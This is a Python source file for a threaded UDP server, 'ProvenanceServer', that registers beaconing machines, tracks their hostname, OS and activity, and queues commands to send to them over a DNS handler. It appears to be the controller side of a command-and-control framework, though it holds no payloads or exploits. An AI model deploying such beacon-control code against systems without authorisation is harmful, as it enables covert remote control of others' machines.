import logging
import threading
from socketserver import UDPServer
from util import parse_whitelist, get_whitelist
from controllers.intefaces.model import ModelInterface
import json
from datetime import datetime
import os.path
from ipaddress import ip_network, ip_address, \
    IPv4Address, IPv4Network, IPv6Address, IPv6Network


class ProvenanceServer(UDPServer, ModelInterface):
    """
    An implementation :module: socketserver.UDPServer used
    to interact with various beacons. The methods defined
    in this class follow the specification on
    https://docs.python.org/3.7/library/socketserver.html
    """

    def __init__(self, server_address, handler, bind_and_activate=True, discovery=True, whitelist=None, blacklist=None,
                 backup_dir="backups", restore=None):
        super().__init__(server_address, handler, bind_and_activate)
        self.logger = logging.getLogger("Provenance")
        self.machines = {}
        self.whitelist = set()
        self.blacklist = set()
        self.discovery = discovery
        self._backup_dir = backup_dir

        if restore:
            self.logger.critical(f"Restoring backup from {restore[0]}")
            self.restore(restore[0])
        else:
            # Get the list of IPs we're supposed to interact with
            if not discovery:
                # via the whitelist argument
                if whitelist:
                    hosts = parse_whitelist(whitelist)
                else:
                    # or manually by command line (eww)
                    hosts = get_whitelist()
                for h in hosts:
                    if '/' not in h[0]:
                        self.add_host(ip=h[0], hostname=h[1], handler=h[2])
                    self.whitelist.add(h[0])


    @staticmethod
    def _ip_in(ip, ip_list):
        if ip not in ip_list:
            return False

        for x in ip_list:
            y = ip_network(x) if '/' in x else ip_address(x)
            if isinstance(y, IPv4Network) or isinstance(y, IPv6Network):
                if ip_address(ip) in y:
                    return True
            if isinstance(y, IPv4Address) or isinstance(y, IPv6Address):
                if ip_address(ip) == y:
                    return True

    def get_request(self):
        return super().get_request()

    def verify_request(self, request, client_address):
        addr, _ = client_address
        # If we're not doing discovery, only whitelisted IPs are valid
        if not self.discovery:
            if self._ip_in(addr, self.whitelist):
                return True
            else:
                self.logger.warning(f"{addr} attempted to connect but isn't whitelisted")
                return False
        # Otherwise, we check if its in the whitelist
        # but blacklist takes precedence
        if self._ip_in(addr, self.whitelist):
            if self._ip_in(addr, self.blacklist):
                return False
        return True

    def process_request(self, request, client_address):
        addr, _ = client_address

        if not addr in self.machines.keys():
            self.machines[addr] = self.RequestHandlerClass(
                request=request,
                client_address=client_address,
                serverinfo=self.server_address,
                handler="DNS"
            )
        return self.finish_request(request, client_address)

    def finish_request(self, request, client_address):
        addr = client_address[0]
        return self.machines[addr].handle(request, client_address)

    # TODO: add function typing for ModelController Methods
    def restore(self, file):
        try:
            with open(file, 'r') as file:
                data = json.load(file)
        except json.JSONDecodeError:
            self.logger.critical(f"Could not restore from {file}")
            return

        for machine_dict in data:
            ip = machine_dict["ip"]
            client = self.add_host(ip)
            client.decode(machine_dict)

    def backup(self, fmt="%Y-%m-%d_%H~%M~%S", failover=True):
        # If there are no machines being tracked we don't care
        if not self.machines.keys():
            return

        def save_failure(d):
            if not failover:
                self.logger.critical(f"Backup failover is off. Backup not created.")
                return

            p = os.path.join(d, f"provenance_backup.bak")
            with open(p, "w") as out:
                json.dump(encodings, out)
            self.logger.critical(f"Creating safe backup file without errors: {p}")

        encodings = []
        for m in self.machines.values():
            encoding = m.encode()
            encodings.append(encoding)
        date = datetime.now().strftime(fmt)
        cwd = os.getcwd()
        filename = f"Provenance_{date}.bak"
        path = os.path.join(cwd, self._backup_dir, filename)
        if not os.path.exists(os.path.dirname(path)):
            os.makedirs(os.path.dirname(path))
        try:
            with open(path, "w") as file:
                json.dump(encodings, file)
            self.logger.critical(f"Backup saved to: {path}")
        except OSError as e:
            self.logger.error("Couldn't create backup file due OSError")
            self.logger.debug("Windows don't allow certain characters in filenames.")
            save_failure(cwd)

    def shutdown(self):
        pass

    # ===========================================
    # Model Interface Methods
    # ===========================================

    def get_hosts(self):
        return self.machines.keys()

    def add_host(self, ip, hostname=None, handler=None):
        new_handler = self.RequestHandlerClass(
            request=None, client_address=(ip, None), serverinfo=self.server_address,
            hostname=hostname, handler=handler or "DNS"
        )
        if ip not in self.machines.keys():
            self.machines[ip] = new_handler
            return new_handler
        return None

    def get_queued_commands(self, host):
        machine = self.machines[host]
        return machine.queued_commands

    def get_sent_commands(self, host):
        machine = self.machines[host]
        return machine.get_sent_commands()

    def queue_command(self, ctype, ip, cmd):
        machine = self.machines[ip]
        machine.queue_command(ctype, cmd)

    def remove_command(self, ip, cmd_id):
        machine = self.machines[ip]
        machine.remove_command(cmd_id)

    def remove_host(self, ip):
        pass

    def get_last_active(self, ip):
        machine = self.machines[ip]
        return machine.last_active

    def get_hostname(self, ip):
        machine = self.machines[ip]
        return machine.hostname

    def get_beacon(self, ip):
        machine = self.machines[ip]
        return machine.beacon

    def get_os(self, ip):
        machine = self.machines[ip]
        return machine.os

    def get_machine(self, ip: str):
        return self.machines[ip]


class ThreadedProvenanceServer(ProvenanceServer):
    """ A Threaded version of the Provenance server """

    # Decides how threads will act upon termination of the
    # main process
    daemon_threads = False
    # If true, server_close() waits until all non-daemonic threads terminate.
    block_on_close = True
    # For non-daemonic threads, list of threading.Threading objects
    # used by server_close() to wait for all threads completion.
    threads = []

    def __init__(self, server_address, handler, bind_and_activate=True, discovery=True,
                 whitelist=None, blacklist=None, backup_dir="backups", restore=None):
        super().__init__(server_address, handler, bind_and_activate,
                         discovery, whitelist, blacklist, backup_dir, restore)

    # Server Handling Methods
    def process_request(self, request, client_address):
        # Create a unique handler for that machine if doesn't exist
        # Otherwise update the info needed to send packets
        addr, port = client_address
        self.logger.debug(f"Processing request from: {addr}")
        if not addr in self.machines.keys():
            self.logger.info(f"New machine added: {addr}")
            self.machines[addr] = self.RequestHandlerClass(
                request=request,
                client_address=client_address,
                serverinfo=(addr, port),
                handler="DNS"
            )

        thread = threading.Thread(
            target=self.finish_request,
            args=(request, client_address))
        thread.daemon = self.daemon_threads

        # Shamelessly taken from socketserver.py
        if not thread.daemon and self.block_on_close:
            if self.threads is None:
                self.threads = []
            self.threads.append(thread)
        thread.start()

    def shutdown(self):
        self.logger.critical(f"Server shutting down")
        super().server_close()
        if self.block_on_close:
            _threads = self.threads
            self.threads = None
            if _threads:
                for t in _threads:
                    t.join()
